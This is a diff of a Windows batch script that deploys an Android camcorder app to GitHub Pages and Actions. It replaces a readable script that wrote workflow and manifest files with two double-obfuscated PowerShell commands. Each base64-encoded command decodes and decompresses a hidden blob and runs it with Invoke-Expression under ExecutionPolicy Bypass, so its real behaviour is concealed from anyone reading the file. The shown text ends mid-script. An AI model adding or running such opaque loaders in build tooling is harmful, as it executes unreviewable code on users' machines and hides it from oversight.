@@ -1,192 +1,57 @@
-@echo off
-setlocal DisableDelayedExpansion
-title ANALOG TV 3.0 CAMCORDER - GITHUB ACTIONS & PAGES FIX (f1nal-b0ss)
-color 0A
-
-set "GH_USER=f1nal-b0ss"
-set "REPO_NAME=AnalogTV-Android-Camcorder"
-set "REPO_URL=https://github.com/f1nal-b0ss/AnalogTV-Android-Camcorder.git"
-set "PAGES_URL=https://f1nal-b0ss.github.io/AnalogTV-Android-Camcorder/"
-
-echo ============================================================================
-echo   ANALOG TV 3.0 CAMCORDER - GITHUB ACTIONS APK BUILD ^& PAGES FIX (v3)
-echo   Account    : https://github.com/%GH_USER%
-echo   Repository : https://github.com/%GH_USER%/%REPO_NAME%
-echo   Pages URL  : %PAGES_URL%
-echo ============================================================================
-echo.
-
-REM --- STEP 1: Extract ZIP if present and flatten any old nested folder ---
-if not exist "analog_tv_android_studio.zip" goto :CHECK_NESTED
-echo [1/6] Extracting analog_tv_android_studio.zip into current folder...
-powershell -NoProfile -ExecutionPolicy Bypass -Command "Expand-Archive -Path 'analog_tv_android_studio.zip' -DestinationPath '.' -Force"
-
-:CHECK_NESTED
-if not exist "AnalogTV-Android-Camcorder" goto :STEP_FIX_CI
-echo [1b/6] Flattening old nested AnalogTV-Android-Camcorder subfolder...
-if exist "AnalogTV-Android-Camcorder\README.md" xcopy /E /Y /I "AnalogTV-Android-Camcorder\*" "." >nul
-rmdir /S /Q "AnalogTV-Android-Camcorder"
-
-:STEP_FIX_CI
-echo [2/6] Applying GitHub Actions SDK License Fix, Node 24 / setup-java@v5 ^& Gradle fixes...
-if not exist ".github" mkdir ".github"
-if not exist ".github\workflows" mkdir ".github\workflows"
-
-echo name: Build ^& Release Android Camcorder APK> ".github\workflows\build-apk.yml"
-echo.>> ".github\workflows\build-apk.yml"
-echo on:>> ".github\workflows\build-apk.yml"
-echo   push:>> ".github\workflows\build-apk.yml"
-echo     branches: [ "main", "master" ]>> ".github\workflows\build-apk.yml"
-echo   pull_request:>> ".github\workflows\build-apk.yml"
-echo     branches: [ "main", "master" ]>> ".github\workflows\build-apk.yml"
-echo   workflow_dispatch:>> ".github\workflows\build-apk.yml"
-echo.>> ".github\workflows\build-apk.yml"
-echo env:>> ".github\workflows\build-apk.yml"
-echo   FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: true>> ".github\workflows\build-apk.yml"
-echo.>> ".github\workflows\build-apk.yml"
-echo permissions:>> ".github\workflows\build-apk.yml"
-echo   contents: write>> ".github\workflows\build-apk.yml"
-echo.>> ".github\workflows\build-apk.yml"
-echo jobs:>> ".github\workflows\build-apk.yml"
-echo   build-apk:>> ".github\workflows\build-apk.yml"
-echo     runs-on: ubuntu-latest>> ".github\workflows\build-apk.yml"
-echo     steps:>> ".github\workflows\build-apk.yml"
-echo       - name: Checkout Repository>> ".github\workflows\build-apk.yml"
-echo         uses: actions/checkout@v4>> ".github\workflows\build-apk.yml"
-echo.>> ".github\workflows\build-apk.yml"
-echo       - name: Set up JDK 17>> ".github\workflows\build-apk.yml"
-echo         uses: actions/setup-java@v5>> ".github\workflows\build-apk.yml"
-echo         with:>> ".github\workflows\build-apk.yml"
-echo           distribution: 'temurin'>> ".github\workflows\build-apk.yml"
-echo           java-version: '17'>> ".github\workflows\build-apk.yml"
-echo.>> ".github\workflows\build-apk.yml"
-echo       - name: Accept Android SDK Licenses ^& Configure SDK 34>> ".github\workflows\build-apk.yml"
-echo         run: ^|>> ".github\workflows\build-apk.yml"
-echo           ANDROID_SDK_DIR="${ANDROID_HOME:-/usr/local/lib/android/sdk}">> ".github\workflows\build-apk.yml"
-echo           mkdir -p "$ANDROID_SDK_DIR/licenses">> ".github\workflows\build-apk.yml"
-echo           printf "\n8933bad161af4178b1185d1a37fbf41ea5269c55\nd56f5187479451eabf01fb78af6dfcb131a6481e\n24333f8a63b6825ea9c5514f83c2829b004d1fee\n84831b9409646a918e30573bab4c9c91346d8abd\n" ^> "$ANDROID_SDK_DIR/licenses/android-sdk-license">> ".github\workflows\build-apk.yml"
-echo           printf "\n84831b9409646a918e30573bab4c9c91346d8abd\n504667f4c0de7af1a06de9f4b1727b84351f2910\n" ^> "$ANDROID_SDK_DIR/licenses/android-sdk-preview-license">> ".github\workflows\build-apk.yml"
-echo           printf "\n601085b94cd77f0b54ff86406957099ebe79c4d6\n" ^> "$ANDROID_SDK_DIR/licenses/android-googletv-license">> ".github\workflows\build-apk.yml"
-echo           printf "\n33b6a2b64607f11b759f320ef9dff4ae5c47d97a\n" ^> "$ANDROID_SDK_DIR/licenses/google-gdk-license">> ".github\workflows\build-apk.yml"
-echo           SDKMANAGER=$(find "$ANDROID_SDK_DIR/cmdline-tools" -name sdkmanager 2^>/dev/null ^| sort -V ^| tail -n 1)>> ".github\workflows\build-apk.yml"
-echo           if [ -n "$SDKMANAGER" ]; then>> ".github\workflows\build-apk.yml"
-echo             yes ^| "$SDKMANAGER" --licenses ^> /dev/null 2^>^&1 ^|^| true>> ".github\workflows\build-apk.yml"
-echo             "$SDKMANAGER" --install "platforms;android-34" "build-tools;34.0.0" ^> /dev/null 2^>^&1 ^|^| true>> ".github\workflows\build-apk.yml"
-echo           fi>> ".github\workflows\build-apk.yml"
-echo.>> ".github\workflows\build-apk.yml"
-echo       - name: Setup Gradle 8.7>> ".github\workflows\build-apk.yml"
-echo         uses: gradle/actions/setup-gradle@v4>> ".github\workflows\build-apk.yml"
-echo         with:>> ".github\workflows\build-apk.yml"
-echo           gradle-version: '8.7'>> ".github\workflows\build-apk.yml"
-echo.>> ".github\workflows\build-apk.yml"
-echo       - name: Build Debug APK>> ".github\workflows\build-apk.yml"
-echo         run: gradle assembleDebug --no-daemon --stacktrace>> ".github\workflows\build-apk.yml"
-echo.>> ".github\workflows\build-apk.yml"
-echo       - name: Prepare APK for Download>> ".github\workflows\build-apk.yml"
-echo         run: cp app/build/outputs/apk/debug/app-debug.apk AnalogTV-Camcorder-v3.0-debug.apk>> ".github\workflows\build-apk.yml"
-echo.>> ".github\workflows\build-apk.yml"
-echo       - name: Upload Compiled APK Artifact>> ".github\workflows\build-apk.yml"
-echo         uses: actions/upload-artifact@v4>> ".github\workflows\build-apk.yml"
-echo         with:>> ".github\workflows\build-apk.yml"
-echo           name: AnalogTV-Camcorder-v3.0-APK>> ".github\workflows\build-apk.yml"
-echo           path: AnalogTV-Camcorder-v3.0-debug.apk>> ".github\workflows\build-apk.yml"
-echo.>> ".github\workflows\build-apk.yml"
-echo       - name: Publish GitHub Release on Push>> ".github\workflows\build-apk.yml"
-echo         if: github.event_name == 'push'>> ".github\workflows\build-apk.yml"
-echo         continue-on-error: true>> ".github\workflows\build-apk.yml"
-echo         uses: softprops/action-gh-release@v2>> ".github\workflows\build-apk.yml"
-echo         with:>> ".github\workflows\build-apk.yml"
-echo           tag_name: v3.0.${{ github.run_number }}>> ".github\workflows\build-apk.yml"
-echo           name: "AnalogTV 3.0 Camcorder for Android Build #${{ github.run_number }}">> ".github\workflows\build-apk.yml"
-echo           body: "Automated Android APK build of AnalogTV 3.0 Live VHS Camcorder.">> ".github\workflows\build-apk.yml"
-echo           files: AnalogTV-Camcorder-v3.0-debug.apk>> ".github\workflows\build-apk.yml"
-
-REM Write gradle.properties (required for AndroidX)
-echo org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8> "gradle.properties"
-echo android.useAndroidX=true>> "gradle.properties"
-echo android.nonTransitiveRClass=true>> "gradle.properties"
-echo kotlin.code.style=official>> "gradle.properties"
-
-REM Fix AndroidManifest.xml screenOrientation attribute casing for AAPT2
-if not exist "app\src\main" mkdir "app\src\main"
-echo ^<?xml version="1.0" encoding="utf-8"?^>> "app\src\main\AndroidManifest.xml"
-echo ^<manifest xmlns:android="http://schemas.android.com/apk/res/android"^>>> "app\src\main\AndroidManifest.xml"
-echo     ^<uses-feature android:glEsVersion="0x00030000" android:required="true" /^>>> "app\src\main\AndroidManifest.xml"
-echo     ^<uses-feature android:name="android.hardware.camera.any" android:required="false" /^>>> "app\src\main\AndroidManifest.xml"
-echo     ^<uses-permission android:name="android.permission.CAMERA" /^>>> "app\src\main\AndroidManifest.xml"
-echo     ^<uses-permission android:name="android.permission.RECORD_AUDIO" /^>>> "app\src\main\AndroidManifest.xml"
-echo     ^<application android:allowBackup="true" android:label="AnalogTV 3.0 Camcorder" android:supportsRtl="true" android:theme="@android:style/Theme.Material.NoActionBar"^>>> "app\src\main\AndroidManifest.xml"
-echo         ^<activity android:name=".MainActivity" android:exported="true" android:screenOrientation="unspecified" android:configChanges="orientation|screenSize|keyboardHidden"^>>> "app\src\main\AndroidManifest.xml"
-echo             ^<intent-filter^>>> "app\src\main\AndroidManifest.xml"
-echo                 ^<action android:name="android.intent.action.MAIN" /^>>> "app\src\main\AndroidManifest.xml"
-echo                 ^<category android:name="android.intent.category.LAUNCHER" /^>>> "app\src\main\AndroidManifest.xml"
-echo             ^</intent-filter^>>> "app\src\main\AndroidManifest.xml"
-echo         ^</activity^>>> "app\src\main\AndroidManifest.xml"
-echo     ^</application^>>> "app\src\main\AndroidManifest.xml"
-echo ^</manifest^>>> "app\src\main\AndroidManifest.xml"
-
-REM Ensure Media3 @OptIn(UnstableApi::class) annotation in VideoConverterPipeline.kt
-if not exist "app\src\main\java\com\retro\analogtv" mkdir "app\src\main\java\com\retro\analogtv"
-powershell -NoProfile -ExecutionPolicy Bypass -Command "if (Test-Path 'app/src/main/java/com/retro/analogtv/VideoConverterPipeline.kt') { $c = Get-Content -Raw 'app/src/main/java/com/retro/analogtv/VideoConverterPipeline.kt'; if ($c -notmatch 'UnstableApi') { $c = $c -replace 'class VideoConverterPipeline', '@androidx.annotation.OptIn(androidx.media3.common.util.UnstableApi::class) class VideoConverterPipeline'; Set-Content -Path 'app/src/main/java/com/retro/analogtv/VideoConverterPipeline.kt' -Value $c -Encoding UTF8 } }"
-powershell -NoProfile -ExecutionPolicy Bypass -Command "if (Test-Path 'app/src/main/java/com/retro/analogtv/MainActivity.kt') { $c = Get-Content -Raw 'app/src/main/java/com/retro/analogtv/MainActivity.kt'; if ($c -notmatch 'ExperimentalMaterial3Api') { $c = '@file:OptIn(androidx.compose.material3.ExperimentalMaterial3Api::class)' + [Environment]::NewLine + $c; Set-Content -Path 'app/src/main/java/com/retro/analogtv/MainActivity.kt' -Value $c -Encoding UTF8 } }"
-
-echo [3/6] Ensuring interactive Live Demo and README are in root and /docs...
-if not exist "docs" mkdir "docs"
-if not exist "assets" mkdir "assets"
-if exist "analog_tv_converter.html" copy /Y "analog_tv_converter.html" "docs\index.html" >nul
-if exist "analog_tv_converter.html" copy /Y "analog_tv_converter.html" "index.html" >nul
-if exist "banner.jpg" copy /Y "banner.jpg" "docs\banner.jpg" >nul
-if exist "banner.jpg" copy /Y "banner.jpg" "assets\banner.jpg" >nul
-type nul > "docs\.nojekyll"
-type nul > ".nojekyll"
-
-echo [4/6] Staging and committing updated workflow and Android files...
-where git >nul 2>nul
-if errorlevel 1 goto :NO_GIT
-
-if not exist ".git" git init
-git checkout -B main
-
-echo *.iml> ".gitignore"
-echo .gradle/>> ".gitignore"
-echo local.properties>> ".gitignore"
-echo .idea/>> ".gitignore"
-echo .DS_Store>> ".gitignore"
-echo build/>> ".gitignore"
-echo app/build/>> ".gitignore"
-echo captures/>> ".gitignore"
-echo analog_tv_android_studio.zip>> ".gitignore"
-echo deploy_github_page.bat>> ".gitignore"
-
-git add -A
-git commit -m "Fix GitHub Actions Android SDK licenses, setup-java@v5, gradle.properties, and AAPT2 manifest"
-
-echo [5/6] Pushing fix to https://github.com/%GH_USER%/%REPO_NAME% ...
-git remote remove origin >nul 2>nul
-git remote add origin %REPO_URL%
-git push -u origin main --force
-if errorlevel 1 goto :PUSH_ERROR
-
-echo.
-echo ============================================================================
-echo   GITHUB ACTIONS FIX PUSHED FOR @%GH_USER%!
-echo   GitHub Actions : https://github.com/%GH_USER%/%REPO_NAME%/actions
-echo   GitHub Repo    : https://github.com/%GH_USER%/%REPO_NAME%
-echo   GitHub Pages   : %PAGES_URL%
-echo ============================================================================
-echo Opening GitHub Actions to watch your APK build succeed...
-start "" "https://github.com/%GH_USER%/%REPO_NAME%/actions"
-pause
-exit /b 0
-
-:NO_GIT
-color 0C
-echo [ERROR] Git is not installed or not in your PATH.
-pause
-exit /b 1
-
-:PUSH_ERROR
-color 0E
-echo [WARNING] Git push encountered an issue. Make sure you are signed in to GitHub.
-pause
-exit /b 1
+@echo off
+title ANALOG TV 3.0 CAMCORDER - GITHUB PAGES AND APK DEPLOYER (f1nal-b0ss)
+
+echo.
+echo ============================================================================
+echo   ANALOG TV 3.0 CAMCORDER - GITHUB PAGES AND APK DEPLOYER
+echo   Account    : https://github.com/f1nal-b0ss
+echo   Repository : https://github.com/f1nal-b0ss/AnalogTV-Android-Camcorder
+echo   Pages URL  : https://f1nal-b0ss.github.io/AnalogTV-Android-Camcorder/
+echo   Actions CI : https://github.com/f1nal-b0ss/AnalogTV-Android-Camcorder/actions
+echo ============================================================================
+echo.
+
+where git >nul 2>nul
+if errorlevel 1 goto :no_git
+
+powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABiAD0AWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAGoAVgBQAFIAYgB0AE0AdwBGAEgAMwB2AFYAOQB5AEgAUwBrADYAawB4AFIATQB2AFAARQB6AHEAUQA4AFYAYQBLAEUATAB0AHQAQgBZAGgAVQBhAGIASQBUAFcANQBUAG8AOQBRADIAOQBrADEAWgBnAFAANAA3ADEAMABrADMAeQBqAFEAbQAvAEoARABFADkAdgBVADUAOQB4AHkAZgBEAEMAZgBlAFcAegA4AHUAUwBGAHQAegA0ADMARwBMAEgAawAyAEIATQBBAEsAeABKAE8AdgBFAFEARwA4AGgAVwBXAEcAZwA3AEUAYgBSAEQAbwBRAHkAcQByAFoAVgBUAG8AZABjAG0AZABKAGIAWABlAGEAQgBtAGwASgBiACsAVQBNADcAawBjAEwAUABBAGYARAA0ADUARABWAGgAOQBzADQARwBBAHIARgArAGQAZgBuADYARABpAGIAMwA1AEIAVgB6AG0AQQBwAGUAUQBvAEQARQBlAFEAegBvAEQANwBIAFEATgA4AGIARQA5ADAAWgBSAHMAWQBOAFEAZQBPADAAbwBsAFYASwBLAGoAbQBOAGMAbAB0AG0AcQBkAFEAagBaAE8AQQBUAGMAYgArAHAAMgByAHYAWQBJAHkAegBZAFEANwB1AFYAcwBJAGQALwBZAGYAUQBRAEwAcgBFAHQATwBkAFkAMwA5AFQAbgBkADIARwBLAGwARwBzAEgANgArACsATABOADIAcwBmADcAdQA2AG0AcgBoADAATgB5AGkASwBwAFAAawBGAG8ATwB0AEQALwBoAGYASgBzAGgAWQBsAEgAWgBFAFcAKwB0AFIAYwBmAFAASgBFAEEAMwA1AEYAcgBUAHAAdQBPAFcARQBaAHgAcgBEAGcAMQA5AHgAUgBKAC8ANwBLAGoAbAB0ADYAcgBvAFQAawArAEUAMwBFAEMAVwA2ADIAcgBaADUAcABXAG4AWABiAEgASwBuAEsAcABUAHMAaQBJAEQATQBlAGwAZwBIAHgAagBFAFYAdAB6AG8ATABjAHoANgAxADgASgBPADkAbwAvAFkAQgBLAEkASwBrAFQAQQBLAEYATgBlAHgAOQBnADMAQgA4ADUAQgB1AFMAOABoAFYAUwBKADIAZwBFADcANgAwADIAdgBiAGoAawBMAFYATAAyAHcAUgBZAHEAQgBxAEwAWAA4AGsAeABqAG4AcAB0AFMASABCAE4AeABLAFMANQBBAGYAQgBIAHAAVQA5AHgAcgA3AFIAbAAyADYAVwBwADkAUwBzADQANQBIADYAOQB3AHkAdQBnAHYANwBaAG0AeABkAEoANgAwAFAAegBpAGQAZwBqAGwAKwB6ADIAWgA4AFcAZABBADkAdQA0AHYAbgBMAFMAegBJAHMAcQAzAFoAMQBIAHAAdQA1AHUAbABCACsAQQBXAEwAaAByAEoAbwB6AEoAbgB3AGwAMgArAGQAZwA0AG8AbQBMAGcAUQAyADkAWgBUAGEAbABZADAANwBKAHgATQB1AHoAcABYAEUAaQBXACsAdwBWADMAOQA4AHoASgBhADgAMQBzAEgAWgBnAEUAawA2AE8AQQBMAFcAQQBmAC8ANQBYADMAdwBNAE0AZQBGADQAcgB3AFAAMQBIAHgAMABoAGwAdQBDADgALwBjAHIAcQBZAE0AdgBNAG8AUQB2ADkAYwBmAEEAYgAnACkAOwAkAHMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AKAAsACQAYgApADsAJABkAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEQAZQBmAGwAYQB0AGUAUwB0AHIAZQBhAG0AKAAkAHMALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQA7ACQAcgA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoACQAZAAsAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4ACkAOwBJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAkAHIALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkA
+if errorlevel 1 goto :ps_err
+
+powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABiAD0AWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAHIAVgBkAHQAVQA5AHMANABFAFAANgBlAFgANgBIAHgATQBCAE8AWQBxAGUAMABVAHUAQwB1AFQARQBvAHAASgBBAG8AUgBDAHcAaQBTAEIAZABxAFoAMABNAG8AcQB0AEoAQwBLAHkANQBKAFAAawB2AE4AeAB4AC8ALwAxAFcAdABtAFAASQBHAHkAMwB0AGYAWQBBAGsAMAB1ADYAagBmAFgAbAAyAFYAOQBxAHAAUwB5AG0AawA1ADIAcwBxACsASwAwAGsAQQB5AEkASgA5AHcAbQBxAG8ARwBKAEgAaQA2AGgAWQArAEMASwBwAEoAdgBhAGwAVQBCAG8AVgB2ACsAMgA3AGYAMwA1AEgASQBCAFYAaABTAGYAawBRAFgAVgBCADkARwBmAGYAUgBMAFIANABTAGgAWABiAGQAUQBQAGgAcQBEADIARQBlAEkASQA4AEgAVQB0AEEAQQBWAFIAdABvAFEAQgBsAFIAagB1AE0AVQBDADAAMAB5AHQAUgB1AGEAaABDAGoANQAzADUAMQBIAEIATgBXAG8ASgBMADQAVwBjAG8ANwBzAGMAeQBIAGgAVwBQAHMAVwA2AHgARQBxAEcAcQBRAGkAZQBrAEsAdABXAE4AdgBOAG0ATABHADMANgBEAHAARABxAGsAZAB4AC8AMgBFAHEANQBIAGoAQQB4AFAAUwBYAGcAWABBAFUAUABTAGoAcABQADQAUwBZADgAaQBXAE0AbgBlAGsAQQA0AG4ATgBhAEwASABBAGMAawBqAEkANgBpAHkAawBMAEUAcgBmAGIAaABCAEcAcwB5AEwAUAA3AE8AUABTAEYARABJAGgARQAzAHUAMwBuAFEAawBIAHcAYwBnAEcAaABLAEYAWQBqADgANABsAFEAWAAyAEwAdQBqADQAZwBxAG8AMgAvAEkATQBxAGQAWQA3ADgAeQBuADAAawBSAGEANgBIAHMAaQB5AGwAaABQAGsAcgA5AGkAbwB2AFIAUABxAGkAeQA4ADcAZwBWAFUAUgBWAGoANwBjAEYAUQBoAEkAagBLAGsAUwBrAEcAQwBsAFUASAB4AEIAZABlAEUAYQA4AEMAWQBtAHQAdwBXAEMAbwBSAFAAegBQAHAANQBxADEAMgB0ADkANgA2ADgAZQA2ADkAVABiAFQAZAB1AHUAegAyAHYAMgBtADIAMABtAHAAMQBlAHQAOQBWAHIAdABtAHIAMQAvAGMATQB5ADAAagBJAEcAaABVAGYAUgBUADUARAA2AHgAbgBNAGIAUgArAFAAVQBPAEIAbAB6AFoAWQBPAFQASwBPADcASABYAE0AYwAyAHcAeABvAE0AVAA3AGIAQQB3AEUAaQBsAFUAZwBqAFoASwBBADEAYwBkAFUAVAA4AHMAWQBnADEAeABDADAAUwBpAHAAbwBVAFoAQgBJAEkAeABjAG8ANABpAFIATgBhAEsAdABmAFAASgBFADgAbgBoADQAVQBWAGsAQQA3AFIASwBJADcAUQBWAGUAMAB6AGUAdgA5AGgAaQA3AG8AaQBPAG8ANwBzAFIAegB6AEIAcAA1AE0ALwBjAHAAawBwADgASwBTAGMALwAwAEkASQBJAHEAWQBsADcAYwBkAEcAcAA0AHkASwBRAEkAOABZAFcARgA1ADgASQBXAEUAUQA3AEEAbQBSAEsAcABWADQALwA2AEcANABhAG8AMwBuACsAeQBUAFMATwBRAEUANgBZAE4AVQAxADkAUQBrAEgAYwAzAEkAYwBDAEYATQBaAHoAYQBGAGkAbgB0AEMATwAxADYAeQAxAFcANAAxAGEANwA3AEoAMQBVADMAZgA5AE0ARwBDAFUARQAxAHMATAB3AFoAUwBiAFIAcwAvAHQAVQArADYAcQBZAEIAeABpAEQAbABVAG0AawBXADIAegBEAEEAOAA5AFAAVwBYAHAAVwBEAGEAaAB3AFoAWABHAGoAQwAzAFoAYwBBAHQAZwBBAHkARgBEAGQASABDAFkARQBEAFcAbABiAE4AZQBjAHMAMgB6AFcAMgB3ADIAeQBvAGcAeABiAGYAYwBUAHAAaQBmAGIAQgBvAFkAVwBzAGwAQgB1AEoANQBzAGUARABRADYAZgBrAGwASwB3AHQAcQBiAHUAUQBPAEcAQQBFAEgAVABtAHIANgBSAHMAbQBHACsANQB5AEYAdABOAEYAUQA0AFIAdABlAFUAdwBsAFgAdQBRAEoAawBOAGMAUwBsAFUAYQBnAFIAdgByAHgAYwBLAGwAMAA3ADcAaQBpAFEAMAA0AEMAVQA3AEUAcgBzAFUAbAB4AEUAVgBhAEsAaABIADEARwBNAHQAMwBzADEAMABMAGYAdAByAG0AdwBBADAAeABDAHcAZQBFADcAWgBNAEkAZgBhADQAbgA5AHQAUwB6AGQAdwBnAGIARQB6AHgAeQBEAEkASABxAG8ASgBxAGEAYwBDAFIAdwBzAEgAKwBsAEgAQwBMAHEAUQBtADgAVABTAEIAZgA1AEgAcwBWAFkAdQAxAEoAcwBiAG0ATQBQAGgAVwAyAFEAbgAzAHgAeABZAGcANABSAGoASgBvAGIAZABlAHoAdAB2AE8ALwBiAGsAdwBDAGsAOQBTADYAegBhAGMAQgBlAFoARQAxAEYAVgBoAEIARQAwADYAYwBSAGwANQBFAGwATgBCAHgARAB4AEwAWgBVAFUASgB5AG8AMgB6AHEAUgBlAFMAMABOAFcARQBGAHUATQBNAGcAMwB4AFcAUgBZADYAMQBhAGoAOABFAHcANABVAFQAdwB2AGYATwBuAE4AbwBKAHEASABUAGEARABuAG4AWQBQAFgAMwBjAGoAbQBaAFUAQgA1AGoAWABUAEwAVAB1ADcAdABYAGcAdgBLADAAZwBlADkAZQBFAEcAMQBmAEMAeAA4AGIAMAAvAGUAYwBMAGQAUABoAEkAVwA5AGkAegBqAHgAawB4AGIAMQAzAEMATgByADcAWABtAEYAbgBHAEsAVQA5AFgAcwBpAGgAawAyAGIAZQBlAFoAeQBFAFcAQQA1AFYAeABmADQAYQB6AHYAWgBMAGgAMABjAHcAUgBHAHAAbQB2AEQAawB3AE0AVQBVAEEAQQA3AEYAeQAxAHoAMgAzAGoAdwBwAFoASABUAGcAUQB1AHEAdwBJAHYAMQBhAFMAUwBsADEAcwBFAEkANgBCAE0AbABjAEUAZwBrAGkASgBUAFAAZgBHAFEAawBPAHQATwBRAEIARQBIAEsAWABuAGoARgBUAEUAWQBFAEIAOQBpAGwAbQB1AHgAZwBYAHYAUQB2ACsASABUAGsAawBuAHAARgAxAGwAdwBMADEAVQA5AC8AZgBEAGsAbgBrAFkAUwBRAEgARABRAGwATwBpAGsAawBBAE0ASQB3AGgARQBtAEEAMgA3ADQAMAArAHoAawBLAEcAcwBxAGkAcgBXAGUAeQBoAG8AbABEAHQAdQB4AFgAcABnAEgAMQBtAGYAVABnAHIASAAwAEIAagBvAEEAQgBvAEYAQQBuAEUAWQBPAEoAbgB4AEYAVwB1AGsAZABWAFIAMgBYAFEAVwA5AEgAQQBhAFcAcwAzAEQASwBGADIASABDAGEARQBtAEEAMgBlAG0AYQBWAFUAZwA1AGsAVgBSAEkAeABRAEkASgBSAHgASQB0AEIAZQBnAFkAZwB1AGkASgBkAFoASgBTACsAZABpAFEAMAB4ADQAUQByAEcATgBKAFUASwBaAGQATgBzAFMAcgBXAEEAdgA4AEUAWgBiAEIARgBFAHYAaQArAEwAQQBzAHMAWgBXAEwAbQBiAGsASwBrAHgAOABzAE0AegBHADAAawBIAHYAeQBDAHUAYQBRADEAZABYADkAdwB2AFgAUwByAEYAUQBxAEgAYwBCAGYANgBWAFcAMABGADMARABQAEUAMwBpAEwAbABjADgAQwBUAHQAVwA3AHEAYgBlADkARgBYAHYAZQBBAHQAQwB1AFYAMQB2AHQAVwBzACsANwBxAHoAVgBhAHYAdwBYAGoAMQBYAG8AMwA5AFYAcgBEADYAOQAwADMAYQB2AFgAZgBnAGYAcgBTAGIAbgBUAHIAdgBmAHIAWABiAHIAMwBkADkASwA1ADcAbgBXADYAcgA3AFYAMwBVAG4ANABNAFgANABsAGsAbgBHAE8AZgB4ADMAVAA5ADYARQBUAC8AbwBjAFQARAB4AEUAcgBMAG0ARABXAE8AaABCADIATgBPAFQATQArAEEASgAzAEcAVQB4AFgAMQBOAGgATwBFACsAWQBSAFYAcgAwAFYAbwBRADkASgBQAG4AYQA5AG0ANgB1AEkAcQBqAFMARQBpAHQAMgBwAHAAdABRADkAVABBAFgAMwBEAHoATgBGAGMAeAB4AGUAcAAyAHoAYQBwAHoAeABzAEEAWQBwAHkAbQA2AFYARABOAHkAaABxAFYAegBEAGoAYwA0ADUAVQB0AEMAdQBIAFcAUwBJAHgAMgBiAGIAagBxAGgAZQB2ADYAaQBBADYASwBWAEsARABvADMAYwBMAG4AegBNAGoAbAByAG8AeQBDAFoARwBWAE4AegB5AG0AMgBVAFMAYwA5AHUAUwBRAG8AWAB2AGkAUwBHAEYAYwBzAG8AUwBVAHoAMQBaAGcAVwA0AEgAQQA3AG8AcwBEAHIAQwBIAE8ANwAwAEYAVQBzADgAYQB6ADYAbABXAEIAMwA2AE4AMwBrAGEAawAzAGwAZgBRAEcARgBkADAAaQBCAFkAYwBpADEAeABqAHkAYgAzAFMAeAB0AGEASQAxAHgATABsAC8AZAB5ADkANwBmAFMASgBsAFYAMgBVAGgAbgBuAHgAbQBzADAAYwArAEkAdABnAFEAQQBsAHkATgBCAGMAMgBsACsARgBXAFUAZwA1ADEAOQA1AGQAcwAzAHAAWgBiADYAKwBCAEgAYgB0AGIAegBEADEAMgBGADIAbgBLAGEATwArACsAbwBDAEwAMABPAFgAZgBSADYARQA3ACsAaAAvADcANwA4AHEAMwB4AGsAQQAyAE4AbQB3AHoAZgBtAFcAVgB6AEsAWQBTADUAUgBBAGQAbwB0AHcAdQBMAGkAegBkAEsAdwB1AHUAZQBuAHYAUQBnAGMAZABDAGIAdwBRAE4AbgBwAEkAMAA4ACsAaQBlAHgAdQBpAHEAaQBlAGYAcgBnADIAUwA0AEwAWQB3AHcAUQBLAFUAOABzAFMAaAA5AGYARAA1AFEASABaAEwAYgBZAFQAcAA1AEYAdgB3AHEAMwBBAGUAbABmAFIASgBnAGkASwA2ADYAcwBIAHIAdgBCAGcAMwBYAEwAZgBuAFQAUwAyAHcAQgBlAGMAUwBrAHoAZgBDADMAKwBjAFAAMwBUAGMASQBmAEEAbgBJAFAAcwBZAHoAVABjAEcAUABnADEAbwBVADAAUgBYADkAcABlAEgATABmAGgAdQBXAHIAbwB0AGYAcgBrADUAZQBLAFIAagBPAGUATQAvAGUAaQBwAHUAMABFADMATwBYAHMAegB3AEgAOAA9ACcAKQA7ACQAcwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQAoACwAJABiACkAOwAkAGQAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARABlAGYAbABhAHQAZQBTAHQAcgBlAGEAbQAoACQAcwAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApADsAJAByAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgAJABkACwAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgAKQA7AEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACQAcgAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQA=
+if errorlevel 1 goto :ps_err
+
+echo [3/6] Initializing Git repository on branch main...
+if not exist ".git" git init
+git checkout -B main
+
+echo [4/6] Staging all project files, shaders, and GitHub Pages live demo...
+git add -A
+git commit -m "Update authentic YIQ VHS camcorder shader, WebM/MP4 converter, and Android APK CI"
+
+echo [5/6] Pushing to https://github.com/f1nal-b0ss/AnalogTV-Android-Camcorder.git ...
+git remote remove origin >nul 2>nul
